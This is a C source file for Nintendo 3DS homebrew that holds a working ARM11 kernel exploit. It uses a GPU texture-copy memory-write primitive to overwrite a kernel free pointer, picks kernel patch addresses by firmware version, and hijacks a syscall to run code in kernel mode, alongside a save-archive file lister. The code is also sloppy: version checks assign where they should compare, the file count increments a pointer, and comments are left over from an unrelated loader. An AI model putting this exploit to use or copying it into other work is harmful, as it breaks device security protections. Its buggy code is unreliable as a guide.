#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
FS_archive saveArchive;
u32 archives[27] = {0x3, 0x4, 0x6, 0x7, 0x8, 0x9, 0xA, 0x12345678,0x12345679,0x1234567B,0x1234567C,0x2345678A,
0x2345678B,0x2345678C,0x2345678D,0x2345678E,0x567890AB,
0x567890AC,0x567890AD,0x567890AE,0x567890AF,0x567890B0,
0x567890B1,0x567890B2};
u32 archiveCount = 0;

struct FileHandle {
    Handle handle;
    size_t head;
};

struct DirStruct {
    Handle handle;
    struct dirent activeEntry;
};
struct DirStruct dir;
char fs_cwd[512];
void fs_chdir(const char* s);
char* fs_getfilelist(int *nfiles);
void fs_relativePath(char* dest, const char* src);

int main()
{
	// Initialize services
	srvInit();			// mandatory
	aptInit();			// mandatory
	hidInit(NULL);	// input (buttons, screen)
	gfxInitDefault();			// graphics
	fsInit();
	sdmcInit();
	hbInit();
	
	qtmInit();
	consoleInit(GFX_BOTTOM, NULL);

	uvl_entry();
	printf("done\n");

	u8 isInserted = 3;
	int nfiles = 0;
	saveArchive = saveArchive=(FS_archive){0x1234567C, (FS_path){PATH_EMPTY, 1, (u8*)""}};
    strcpy(fs_cwd, "");
    dir.handle = 0;
    fs_chdir("/");
	//consoleClear();

	while (aptMainLoop())
	{
		// Wait next screen refresh
		gspWaitForVBlank();

		// Read which buttons are currently pressed 
		hidScanInput();
		u32 kDown = hidKeysDown();
		u32 kHeld = hidKeysHeld();
		
		// If START is pressed, break loop and quit
		if (kDown & KEY_X){
			break;
		}

		if(kDown & KEY_A)
		{
consoleClear();
			Result ret;
			saveArchive=(FS_archive){archives[archiveCount], (FS_path){PATH_EMPTY, 1, (u8*)""}};
			
			u32 totalWritten;
			Handle fileHandle;
			ret=FSUSER_OpenArchive(NULL, &saveArchive);
			if(ret)
			{
				printf("Save Archive open failed!\n");
				goto saveEnd;
			}
			strcpy(fs_cwd, "");
			dir.handle = 0;
			fs_chdir("/");

			char* files = fs_getfilelist(&nfiles);
			printf("%i files\n", nfiles);
			printf(files);

			saveEnd:
			printf("done %x\n", archives[archiveCount]);
			archiveCount++;
		}

		if(kDown & KEY_B) printf("%x ", *(int *)0x14410000);

          FSUSER_CardSlotIsInserted(NULL, &isInserted);
		printf("\033[%d;%dH%i\n", 0, 0, isInserted);

		// Flush and swap framebuffers
		gfxFlushBuffers();
		gfxSwapBuffers();
	}

	// Exit services
	hbExit();
	sdmcExit();
	fsExit();
	gfxExit();
	hidExit();
	aptExit();
	srvExit();
	
	// Return to hbmenu
	return 0;
}

void fs_chdir(const char* s) {
    char buffer[256];
    fs_relativePath(buffer, s);

    if (dir.handle != 0)
        FSDIR_Close(dir.handle);

    Result res = FSUSER_OpenDirectory(NULL, &dir.handle, saveArchive,
            FS_makePath(PATH_CHAR, buffer));

    if (res) {
        FSUSER_OpenDirectory(NULL, &dir.handle, saveArchive,
                FS_makePath(PATH_CHAR, fs_cwd));
        return;
    }

    strcpy(fs_cwd, buffer);
}

void fs_relativePath(char* dest, const char* src) {
    bool back = false;
    if (strcmp(src, "..") == 0 || strcmp(src, "../") == 0) {
        if (dest != fs_cwd)
            strcpy(dest, fs_cwd);
        back = true;
    }
    else if (src[0] == '/')
        strcpy(dest, src);
    else {
        if (dest != fs_cwd)
            strcpy(dest, fs_cwd);
        if (dest[strlen(dest)-1] != '/')
            strcat(dest, "/");
        strcat(dest, src);
    }

    while (strlen(dest) > 1 &&
            strrchr(dest, '/') != 0 && strrchr(dest, '/') == dest+strlen(dest)-1)
        *strrchr(dest, '/') = '\0';

    if (back) {
        if (strrchr(dest, '/') != 0) {
            *(strrchr(dest, '/')) = '\0';
            if (strcmp(dest, "") == 0)
                strcpy(dest, "/");
        }
    }
}

char* fs_getfilelist(int *nfiles)
{
	FS_path dirPath = (FS_path){PATH_CHAR, 6, (u8*)"/"};
	FS_dirent entry;
	int i;
	
	FSUSER_OpenDirectory(NULL, &dir.handle, saveArchive, dirPath);
	*nfiles = 0;
	for (;;)
	{
		u32 nread = 0;
		FSDIR_Read(dir.handle, &nread, 1, &entry);
		if (!nread) break;
		//if (!IsGoodFile(&entry)) continue;
		*nfiles++;
	}
	FSDIR_Close(dir.handle);

	char *filelist = (char*)linearAlloc(0x106 * (*nfiles));
	
	// TODO: find out how to rewind it rather than reopening it?
	FSUSER_OpenDirectory(NULL, &dir.handle, saveArchive, dirPath);
	i = 0;
	for (;;)
	{
		u32 nread = 0;
		FSDIR_Read(dir.handle, &nread, 1, &entry);
		if (!nread) break;
		//if (!IsGoodFile(&entry)) continue;
		
		// dirty way to copy an Unicode string
		strncpy(&filelist[0x106 * i], entry.name, 0x105);
		i++;
	}
	FSDIR_Close(dir.handle);
	//filelist[0] = "l";
	return filelist;
}

int (*IFile_Open)(void *this, const short *path, int flags) = 0x0022FE08;
int (*IFile_Write)(void *this, unsigned int *written, void *src, unsigned int len) = 0x00168764;
int (*memcpy_)(void *dst, const void *src, unsigned int len) = 0x0023FF9C;
int (*GX_SetTextureCopy_)(void *input_buffer, void *output_buffer, unsigned int size, int in_x, int in_y, int out_x, int out_y, int flags) = 0x0011DD48;
int (*GSPGPU_FlushDataCache_)(void *addr, unsigned int len) = 0x00191504;
int (*svcSleepThread_)(unsigned long long nanoseconds) = 0x0023FFE8;

int uvl_entry();

/********************************************//**
 *  \brief Starting point from exploit
 *
 *  Call this from your exploit to run UVLoader.
 *  It will first cache all loaded modules and
 *  attempt to resolve its own NIDs which
 *  should only depend on sceLibKernel.
 *  \returns Zero on success, otherwise error
 ***********************************************/

int do_gshax_copy (void *dst, void *src, unsigned int len, unsigned int check_val, int check_off)
{
    unsigned int result;

    do
    {
        memcpy (0x14401000, 0x14401000, 0x10000);
        GSPGPU_FlushDataCache (NULL, src, len);

        GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
        GSPGPU_FlushDataCache (NULL, 0x14401000, 16);
        GX_SetTextureCopy(NULL, src, 0, 0x14401000, 0, 0x40, 8);
        memcpy(0x14401000, 0x14401000, 0x10000);
        result = *(unsigned int *)(0x14401000 + check_off);
    } while (result != check_val);

    return 0;
}

int
arm11_kernel_exploit_setup (void)
{
    unsigned int patch_addr;
    unsigned int *buffer;
    unsigned int *test;
    int i;
    int (*nop_func)(void);
    int *ipc_buf;
    int model;
    unsigned char isN3DS = 0;

    // get proper patch address for our kernel -- thanks yifanlu once again
    unsigned int kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
    APT_CheckNew3DS(NULL, &isN3DS);

    if(!isN3DS)
    {
    
        if (kversion == 0x02220000) // 2.34-0 4.1.0
        {
            patch_addr = 0xEFF83C97;
        }
        else if (kversion == 0x02230600) // 2.35-6 5.0.0
        {
            patch_addr = 0xEFF8372F;
        }
        else if (kversion == 0x02240000) // 2.36-0 5.1.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x02250000) // 2.37-0 6.0.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x02260000) // 2.38-0 6.1.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x02270400) // 2.39-4 7.0.0
        {
            patch_addr = 0xEFF8372F;
        }
        else if (kversion == 0x02280000) // 2.40-0 7.2.0
        {
            patch_addr = 0xEFF8372B;
        }
        else if (kversion == 0x022C0600) // 2.44-6 8.0.0
        {
            patch_addr = 0xDFF83837;
        }
        else if (kversion = 0x022E0000) // 2.26-0 9.0.0
        {
            patch_addr = 0xDFF83837;
        }
        else
        {
            printf("Unrecognized kernel version %x, returning...\n", kversion);
            return 0;
        }
    }
    else
    {
        if (kversion = 0x022E0000) // 2.26-0 N3DS 9.0.0
        {
            patch_addr = 0xDFF8382F;
        }
        else
        {
            printf("Unrecognized kernel version %x, returning...\n", kversion);
            return 0;
        }
    }

    printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 

    // part 1: corrupt kernel memory
    buffer = 0x14402000;
    // 0xFFFFFE0 is just stack memory for scratch space
    svcControlMemory(0xFFFFFE0, 0x14451000, 0, 0x1000, 1, 0); // free page 

    buffer[0] = 1;
    buffer[1] = patch_addr;
    buffer[2] = 0;
    buffer[3] = 0;

    // overwrite free pointer
    printf("Overwriting free pointer\n");
    do_gshax_copy(0x14451000, buffer, 0x10u, patch_addr, 4);

    // trigger write to kernel
    svcControlMemory(0xFFFFFE0, 0x14450000, 0, 0x1000, 1, 0);
    printf("Triggered kernel write\n");
    gfxFlushBuffers();
    gfxSwapBuffers();

     // part 2: obfuscation or trick to clear code cache
    for (i = 0; i < 0x1000; i++)
    {
        buffer[i] = 0xE1A00000; // ARM NOP instruction
    }
    buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = nop_slide;

    do_gshax_copy(nop_slide, buffer, 0x10000, 0xE1A00000, 0);

    HB_FlushInvalidateCache();
    nop_func();
    printf("Exited nop slide\n");
    gfxFlushBuffers();
    gfxSwapBuffers();

    /*
    // part 3: get console model for future use (?)
    __asm__ ("mrc p15,0,%0,c13,c0,3\t\n"
             "add %0, %0, #128\t\n" : "=r" (ipc_buf));

    ipc_buf[0] = 0x50000;
    __asm__ ("mov r4, %0\t\n"
             "mov r0, %1\t\n"
             "ldr r0, [r0]\t\n"
             "svc 0x32\t\n" :: "r" (ipc_buf), "r" (0x3DAAF0) : "r0", "r4");

    if (ipc_buf[1])
    {
        model = ipc_buf[2] & 0xFF;
    }
    else
    {
        model = -1;
    }
    *(int *)0x8F01028 = model;
    */

    return 1;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{
    __asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
             "bx lr\t\n");
}

void
invalidate_icache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c5,0\t\n"
             "mcr p15,0,%0,c7,c5,4\t\n"
             "mcr p15,0,%0,c7,c5,6\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_dcache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c14,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_allcache (void)
{
    __asm__ ("mcr p15,0,%0,c8,c5,0\t\n"
             "mcr p15,0,%0,c8,c6,0\t\n"
             "mcr p15,0,%0,c8,c7,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

int __attribute__((noinline))
arm11_kernel_exec (void)
{
    *(int *)0x14410000 = 0xF00FF00F;

    // fix up memory
    *(int *)0xDFF8382F = 0x8DD00CE5;
    invalidate_icache ();
    invalidate_allcache ();
    //memcpy(0xD848F000, 0xFFF00000, 0x00038400);
    //memcpy(0xD84C7800, 0xFFF00000, 0x00038400);
    //memcpy(0xE4410000, 0xFFFF0000, 0x1000);
    invalidate_dcache ();

    return 0;
}

int __attribute__((naked))
arm11_kernel_stub (void)
{
    __asm__ ("add sp, sp, #8\t\n");

    arm11_kernel_exec ();

    __asm__ ("movs r0, #0\t\n"
             "ldr pc, [sp], #4\t\n");
}

/********************************************//**
 *  \brief Entry point of UVLoader
 *
 *  \returns Zero on success, otherwise error
 ***********************************************/
int uvl_entry ()
{
    int result = 0;
    int i;
    int (*nop_func)(void);
    HB_ReprotectMemory(0x14400000, 0x70000 / 4096, 7, &result);
    HB_ReprotectMemory(nop_slide, 4, 7, &result);

 // part 2: obfuscation or trick to clear code cache
    for (i = 0; i < 0x1000; i++)
    {
        nop_slide[i] = 0xE1A00000; // ARM NOP instruction
    }
    nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = nop_slide;
    HB_FlushInvalidateCache();

    printf("Testing nop slide\n");
    nop_func();
    printf("Exited nop slide\n");

    unsigned int addr;
    void *this = 0x08F10000;
    int *written = 0x08F01000;
    int *buf = 0x14410000;

    // wipe memory for debugging purposes
    for (i = 0; i < 0x1000/4; i++)
    {
        buf[i] = 0xdeadbeef;
    }

    printf("Screen: %x", gfxGetFramebuffer(GFX_TOP, GFX_LEFT, NULL, NULL));

    if(arm11_kernel_exploit_setup())
    {
        buf[0] = 0xDEADDEAD;
        printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
        printf("%x\n", buf[0]);
        arm11_kernel_exploit_exec (arm11_kernel_stub);
        printf("%x\n", buf[0]);
        printf("ARM11 Kernel Code Executed\n");
    }
    else
    {
        printf("Kernel exploit set up failed!\n");
    }
    
    FILE *fp;
    fp = fopen("mem-0xFFFF0000.bin", "w");
    fwrite(buf,1, 0x1000, fp);
    //GSPGPU_FlushDataCache (buf, 0x1000);
    //svcSleepThread (0x400000LL);
    //IFile_Write(this, written, buf, 0x1000);
    
    /*
    // FCRAM dump
    for (addr = 0x14000000; addr < 0x1A800000; addr += 0x10000)
    {
        GSPGPU_FlushDataCache_ (addr, 0x10000);
        GX_SetTextureCopy_ (addr, buf, 0x10000, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache_ (buf, 0x10000);
        svcSleepThread_ (0x400000LL);
        IFile_Write_(this, written, buf, 0x10000);
    }
    */

    //svcSleepThread_ (0x6fc23ac00LL); 

    //while (1);*/

    return 0;
}



/********************************************//**
 *  \brief Exiting point for loaded application
 *
 *  This hooks on to exit() call and cleans up
 *  after the application is unloaded.
 *  \returns Zero on success, otherwise error
 ***********************************************/
int
uvl_exit (int status)
{
    return 0;
}
